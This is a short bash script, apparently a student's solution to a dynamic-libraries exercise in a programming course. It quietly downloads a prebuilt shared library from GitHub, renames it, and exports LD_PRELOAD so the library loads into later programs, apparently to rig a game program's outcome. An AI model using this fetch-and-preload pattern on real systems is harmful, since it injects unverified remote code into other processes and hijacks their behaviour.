#!/bin/bash
wget -q --output-document=~/lib101-puts.so https://github.com/B3zaleel/alx-low_level_programming/raw/main/0x18-dynamic_libraries/lib101-gm_overhaul.so
export LD_PRELOAD=~/lib101-puts.so
